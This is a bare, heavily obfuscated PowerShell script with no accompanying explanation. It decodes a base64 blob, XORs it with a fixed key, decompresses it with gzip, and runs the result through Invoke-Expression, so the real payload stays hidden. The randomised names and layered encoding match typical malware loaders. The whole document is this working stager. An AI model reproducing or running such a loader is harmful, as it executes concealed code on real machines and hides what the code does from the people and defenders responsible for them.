$ti436b8lm1je9nw = [System.Text.Encoding]::ascii
function lh2av97q4rnujgwtkxm85ypebsi  {param($79gi4qas2cul5zk )
  $4fgx863minkwcvr = [System.Convert]::FromBase64String($79gi4qas2cul5zk)
  $57jmbq4a8fz39wr= $ti436b8lm1je9nw.GetBytes("w364bephq78x")
    $udt1frx53ji0yke = $4fgx863minkwcvr
    $h5od17m2zuvlng3 = $(for ($azxp9dhn8fjrem7 = 0; $azxp9dhn8fjrem7 -lt $udt1frx53ji0yke.length; ) {
        for ($r76kysux0ioewhv = 0; $r76kysux0ioewhv -lt $57jmbq4a8fz39wr.length; $r76kysux0ioewhv++) {
            $udt1frx53ji0yke[$azxp9dhn8fjrem7] -bxor $57jmbq4a8fz39wr[$r76kysux0ioewhv]
            $azxp9dhn8fjrem7++
            if ($azxp9dhn8fjrem7 -ge $udt1frx53ji0yke.Length) {
                $r76kysux0ioewhv = $57jmbq4a8fz39wr.length
            }
        }
    })
	$ldrwca8vf5s4x2q = New-Object System.IO.MemoryStream( , $h5od17m2zuvlng3 )

	    $8lcj7orw3tvapnk = New-Object System.IO.MemoryStream
        $gledb0q3txnwy2v = New-Object System.IO.Compression.GzipStream $ldrwca8vf5s4x2q, ([IO.Compression.CompressionMode]::Decompress)
	    $gledb0q3txnwy2v.CopyTo( $8lcj7orw3tvapnk )
        $gledb0q3txnwy2v.Close()
		$ldrwca8vf5s4x2q.Close()
		[byte[]] $73emdn149gjkfq8 = $8lcj7orw3tvapnk.ToArray()
 $yxvj8wsc1fpt3kg=$73emdn149gjkfq8
    return $yxvj8wsc1fpt3kg
}
[byte[]]$fyiwm42tlh8p30g=lh2av97q4rnujgwtkxm85ypebsi $gqcrd872t4h65fl
[System.Text.Encoding]::ascii.GetString((lh2av97q4rnujgwtkxm85ypebsi "aLg+NGJlcGh1N7UtGkCVAnKbLA6JOCL1TPLD9YK954zj/j+jMCGBRfhyP4craN4+djKEdTJEfDSbyOadsrq12yEFdrgbwtTLuJ2ynsoVy0HGErNAPS/QCtOxOXkLYS18IH8yPderoJ2DpJs5v8sch7WHc4L1Y8LppJ6LDmuUIrdS3yRVably5rL9ozRrIY9b8ELZxZbxVF4S8R3tlHHkcKFkAzS+SNpsAHg8EWgW4b6RFaWG/AN9ev6nL4sfdJ5yopHEqvJqIug07MI1VY2QduCi9eCzBnGQpoNHXcES62xGbLblo6JLY4Z6dyMXIROCib/BlHklVjq+EHt4nVtYECJngkv+CAFGSEKhtuSiQAvvlgXTafsLAiQlyU+MBOw9TKHjnICdGD1VXlbK/1XIjiMIK0OlkaJXH16Zao1ojqcFboyBSRHLHWVHK5g0LMzJcuts64nY7cfrUndr+N1dRj8Awa/JPYpXPRjPgwlT36uXRGsNmLhPk/iKnaKcpZ5nAay0/jaVZzgk7pAXgNiiE/Bh8cJN4CvDAD6VHn8kyIvvXHAnMb8VeVGW8QFpx8SsMg6SFVF6hqOA8OkOC2e7uwOZb2rTzQVYMxLkEzOvVYJuFYiH/a0hgi2hE4+KkbNSYglYeMbqvhn2xc1R/lCxfJDI/uckEmRBe9lpDZ83ibNwlGQKZeHFt67qYhGhDAgQOTxiMah83cG/d3kstv6b7Y/Sr+RJ3m8zdBUXeufQ/biy8TdulEEMJ9I1X3lQafnKB0seN51BbvAv5Da+S1nCM4hq4EttPSqwV86A+GPycVijyBo5PcQGpNzIV0KGQZEN0ovbAIukRxltSma8Y9oSfQqdZHx5ACVJiiC4lFJzRCHRv/59fFtk+YJWJTHFUccZxjg45FozXm3A0gSCuzeDUUZv3c6INg0ylx02lD+MGu+7b/Kkb1jrM+XApnANadP4nL2XKlaVm6dxyAbhhWrpAAUSpo+6xsiaFQcDm1GegqKKzNOcuYFZo8m8uFvemsNDBEmpSN+Xwlfdkk0b+v7vHNHiR4uYEkZFuGYTulBPYvd3NtpMpJR23zQhQfS78o56b6QK1OeRawj3h62/OzNnrzwkETf7tPMTrDoNrfby2iSIDWIpinj+Uq/q1XxGomws1zW6N0p1iqqJ18hDB4N3w0SHNDhTlrhblpYX9DxWmM/uspJPK4YPbd9GvwKiyP3A6ahpM2Jl"))|iex;